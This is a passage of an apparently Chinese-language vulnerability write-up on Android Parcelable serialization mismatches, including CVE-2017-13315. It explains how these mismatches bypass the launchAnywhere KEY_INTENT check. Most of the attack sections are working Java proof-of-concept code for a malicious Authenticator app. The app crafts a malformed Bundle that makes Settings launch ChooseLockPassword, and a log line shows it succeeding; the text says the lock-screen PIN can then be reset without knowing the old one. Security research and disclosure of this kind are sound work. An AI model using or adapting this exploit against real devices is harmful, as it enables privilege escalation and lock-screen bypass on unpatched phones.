@@ -1,0 +1,175 @@
+            dataStatus = in.readInt();
+            if (in.readInt() == 1) {
+                data = ScanRecord.parseFromBytes(in.createByteArray());
+            }
+        }
+在对txPower这个int类型成员变量进行操作时，写为long，读为int，因此经历一次不匹配的序列化和反序列化后txPower之后的成员变量都会错位4字节。那么如何绕过`checkKeyIntent`检查？
+这是一项有挑战性的工作，需要在Bundle中精确布置数据。经过几天的思索，我终于想出了以下的解决方案：
+在Autherticator
+App中构造恶意Bundle，携带两个键值对。第一个键值对携带一个PeriodicAdvertisingReport对象，并将恶意KEY_INTENT的内容放在mData这个ByteArray类型的成员中，第二个键值对随便放点东西。由于这一次序列化需要精确控制内容，我们不希望发生不匹配，因此将PeriodicAdvertisingReport对象writeToParcel时，要和其readFromParcel对应。
+那么在`system_server`发生的第一次反序列化中，生成PeriodicAdvertisingReport对象，syncHandle、txPower、rssi、dataStatus这些int型的数据均通过readInt读入为1，同时由于接下来的flag也为1，将恶意`KEY_INTENT`的内容读入到mData。此时，恶意KEY_INTENT不是一个单独的键值对，因此可以逃避checkIntent检查。
+接着`system_server`将这个Bundle序列化，此时txPower这个变量使用writeLong写入Bundle，因此为占据8个字节，前4字节为1，后4字节为0。txPower后面的内容写入Bundle不变。
+最后在`Settings`发生反序列化，txPower此时又变成了readInt，因此txPower读入为1，后面接着rssi却读入为0，发生了四字节的错位！接下来dataStatus读入为1，flag读入为1，`Settings`认为后面还有ByteArray，但读入的长度域却为1，因此把后面恶意KEY_INTENT的4字节length
+（ByteArray
+4字节对齐）当做mData。至此，第一个键值对反序列化完毕。然后，恶意`KEY_INTENT`作为一个新的键值对就堂而皇之的出现了！最终的结果是取得以Settings应用的权限发送任意Intent，启动任意Activity的能力。
+#### POC
+参考[2]编写Authenticator App，主要要点：
+在AndroidManifest文件中设置
+实现AuthenticatorService
+    public class AuthenticatorService extends Service {
+        @Nullable
+        @Override
+        public IBinder onBind(Intent intent) {
+            MyAuthenticator authenticator = new MyAuthenticator(this);
+            return authenticator.getIBinder();
+        }
+    }
+实现Authenticator，addAccount方法中构建恶意Bundle
+    public class MyAuthenticator extends AbstractAccountAuthenticator {
+        static final String TAG = "MyAuthenticator";
+        private Context m_context = null;
+        public MyAuthenticator(Context context) {
+            super(context);
+            m_context = context;
+        }
+        @Override
+        public Bundle editProperties(AccountAuthenticatorResponse response, String accountType) {
+            return null;
+        }
+        @Override
+        public Bundle addAccount(AccountAuthenticatorResponse response, String accountType, String authTokenType, String[] requiredFeatures, Bundle options) throws NetworkErrorException {
+            Log.v(TAG, "addAccount");
+            Bundle evilBundle = new Bundle();
+            Parcel bndlData = Parcel.obtain();
+            Parcel pcelData = Parcel.obtain();
+            // Manipulate the raw data of bundle Parcel
+            // Now we replace this right Parcel data to evil Parcel data
+            pcelData.writeInt(2); // number of elements in ArrayMap
+            /*****************************************/
+            // mismatched object
+            pcelData.writeString("mismatch");
+            pcelData.writeInt(4); // VAL_PACELABLE
+            pcelData.writeString("android.bluetooth.le.PeriodicAdvertisingReport"); // name of Class Loader
+            pcelData.writeInt(1);//syncHandle
+            pcelData.writeInt(1);//txPower
+            pcelData.writeInt(1);//rssi
+            pcelData.writeInt(1);//dataStatus
+            pcelData.writeInt(1);// flag for data
+            pcelData.writeInt(0x144); //length of KEY_INTENT:evilIntent
+            // Evil object hide in PeriodicAdvertisingReport.mData
+            pcelData.writeString(AccountManager.KEY_INTENT);
+            pcelData.writeInt(4);
+            pcelData.writeString("android.content.Intent");// name of Class Loader
+            pcelData.writeString(Intent.ACTION_RUN); // Intent Action
+            Uri.writeToParcel(pcelData, null); // Uri is null
+            pcelData.writeString(null); // mType is null
+            pcelData.writeInt(0x10000000); // Flags
+            pcelData.writeString(null); // mPackage is null
+            pcelData.writeString("com.android.settings");
+            pcelData.writeString("com.android.settings.password.ChooseLockPassword");
+            pcelData.writeInt(0); //mSourceBounds = null
+            pcelData.writeInt(0); // mCategories = null
+            pcelData.writeInt(0); // mSelector = null
+            pcelData.writeInt(0); // mClipData = null
+            pcelData.writeInt(-2); // mContentUserHint
+            pcelData.writeBundle(null);
+            ///////////////////////////////////////
+            pcelData.writeString("Padding-Key");
+            pcelData.writeInt(0); // VAL_STRING
+            pcelData.writeString("Padding-Value"); //       
+            int length  = pcelData.dataSize();
+            Log.d(TAG, "length is " + Integer.toHexString(length));
+            bndlData.writeInt(length);
+            bndlData.writeInt(0x4c444E42);
+            bndlData.appendFrom(pcelData, 0, length);
+            bndlData.setDataPosition(0);
+            evilBundle.readFromParcel(bndlData);
+            Log.d(TAG, evilBundle.toString());
+            return evilBundle;
+       }
+### 0x03 案例2：CVE-2017-13315
+五月份修复的CVE-2017-13315出现在DcParamObject类中，对比writeToParcel和readFromParcel函数.
+    public void writeToParcel(Parcel dest, int flags) {
+            dest.writeLong(mSubId);
+        }
+        private void readFromParcel(Parcel in) {
+            mSubId = in.readInt();
+        }
+int类型的成员变量mSubId写入时为long，读出时为int，没有可借用的其他成员变量，似乎在Bundle中布置数据更有挑战性。但受前面将恶意KEY_INTENT置于ByteArray中启发，可以采用如下方案。
+在Autherticator
+App中构造恶意Bundle，携带三个键值对。第一个键值对携带一个DcParamObject对象；第二个键值对的键的16进制表示为0x06，长度为1，值的类型为13代表ByteArray，然后将恶意KEY_INTENT的内容放在ByteArray中；接下来，再随便放置一个键值对。
+那么在`system_server`发生的第一次反序列化中，生成DcParamObject对象，mSubId通过readInt读入为1。后面两个键值对都不是KEY_INTENT，因此可以通过checkIntent检查。
+然后，第二次序列化时`system_server`通过writeLong将mSubId写入Bundle，多出四个字节为0x0000 0000 0000
+0001，后续内容不变。
+最后，`Settings`反序列化读入Bundle，由于读入mSubID仍然为readInt，因此只读到0x0000
+0001就认为读DcParamObject完毕。接下来开始读第二个键值对，把多出来的四个字节0x0000
+0000连同紧接着的1，认为是第二个键值对的键为null，然后6作为类型参数被读入，认为是long，于是后面把13和接下来ByteArray
+length的8字节作为第二个键值对的值。最终，恶意KEY_INTENT显现出来作为第三个键值对！
+#### POC
+    Bundle evilBundle = new Bundle();
+            Parcel bndlData = Parcel.obtain();
+            Parcel pcelData = Parcel.obtain();
+            // Manipulate the raw data of bundle Parcel
+            // Now we replace this right Parcel data to evil Parcel data
+            pcelData.writeInt(3); // number of elements in ArrayMap
+            /*****************************************/
+            // mismatched object
+            pcelData.writeString("mismatch");
+            pcelData.writeInt(4); // VAL_PACELABLE
+            pcelData.writeString("com.android.internal.telephony.DcParamObject"); // name of Class Loader
+            pcelData.writeInt(1);//mSubId
+            pcelData.writeInt(1);
+            pcelData.writeInt(6);
+            pcelData.writeInt(13);
+            //pcelData.writeInt(0x144); //length of KEY_INTENT:evilIntent
+            pcelData.writeInt(-1); // dummy, will hold the length
+            int keyIntentStartPos = pcelData.dataPosition();
+            // Evil object hide in ByteArray
+            pcelData.writeString(AccountManager.KEY_INTENT);
+            pcelData.writeInt(4);
+            pcelData.writeString("android.content.Intent");// name of Class Loader
+            pcelData.writeString(Intent.ACTION_RUN); // Intent Action
+            Uri.writeToParcel(pcelData, null); // Uri is null
+            pcelData.writeString(null); // mType is null
+            pcelData.writeInt(0x10000000); // Flags
+            pcelData.writeString(null); // mPackage is null
+            pcelData.writeString("com.android.settings");
+            pcelData.writeString("com.android.settings.password.ChooseLockPassword");
+            pcelData.writeInt(0); //mSourceBounds = null
+            pcelData.writeInt(0); // mCategories = null
+            pcelData.writeInt(0); // mSelector = null
+            pcelData.writeInt(0); // mClipData = null
+            pcelData.writeInt(-2); // mContentUserHint
+            pcelData.writeBundle(null);
+            int keyIntentEndPos = pcelData.dataPosition();
+            int lengthOfKeyIntent = keyIntentEndPos - keyIntentStartPos;
+            pcelData.setDataPosition(keyIntentStartPos - 4);  // backpatch length of KEY_INTENT
+            pcelData.writeInt(lengthOfKeyIntent);
+            pcelData.setDataPosition(keyIntentEndPos);
+            Log.d(TAG, "Length of KEY_INTENT is " + Integer.toHexString(lengthOfKeyIntent));
+            ///////////////////////////////////////
+            pcelData.writeString("Padding-Key");
+            pcelData.writeInt(0); // VAL_STRING
+            pcelData.writeString("Padding-Value"); //
+            int length  = pcelData.dataSize();
+            Log.d(TAG, "length is " + Integer.toHexString(length));
+            bndlData.writeInt(length);
+            bndlData.writeInt(0x4c444E42);
+            bndlData.appendFrom(pcelData, 0, length);
+            bndlData.setDataPosition(0);
+            evilBundle.readFromParcel(bndlData);
+            Log.d(TAG, evilBundle.toString());
+           return evilBundle;
+        }
+由于Settings似乎取消了自动化的点击新建账户接口，上述POC利用的漏洞触发还需要用户在Settings->Users&accounts中点击我们加入的Authenticator，点击以后就会调用addAccount方法，最终能够启动settings中的隐藏Activity
+ChooseLockPassword。
+    05-07 06:24:34.337  4646  5693 I ActivityManager: START u0 {act=android.intent.action.RUN flg=0x10000000 cmp=com.android.settings/.password.ChooseLockPassword (has extras)} from uid 1000
+原先设置锁屏PIN码的测试手机，就会出现重新设置PIN码界面，点一下返回，就会出现以下PIN码设置界面。这样就可以在不需要原PIN码的情况下重设锁屏密码。
+### 0x04 后记
+没想到序列化和反序列化作为极小的编程错误，却可以带来深远的安全影响。这类漏洞可能在接下来的安全公告中还会陆续有披露，毕竟在源码树中搜索序列化和反序列化不匹配的Parcelable类是较为容易的，漏洞的作者应该持续发现了一批。
+然而，每个类不匹配的情况有所不同，因此在漏洞利用绕过launchAnywhere补丁时需要重新精确布置Bundle，读者可以用其他有漏洞的Parcelable类来练手。
+这类漏洞也是不匹配或者说不一致（Inconsistency)性漏洞的典型。除了序列化和反序列化不一致外，历史上mmap和munmap不一致、同一功能实现在Java和C中的不一致、不同系统对同一标准实现的不一致等等都产生过有趣的漏洞，寻找这种不一致也是漏洞研究的一种方法论。
+### 参考
+[1] [漏洞预警 | Android系统序列化、反序列化不匹配漏洞](https://www.anquanke.com/post/id/103570)
+[2] [launchAnyWhere:
+Activity组件权限绕过漏洞解析](http://retme.net/index.php/2014/08/20/launchAnyWhere.html)
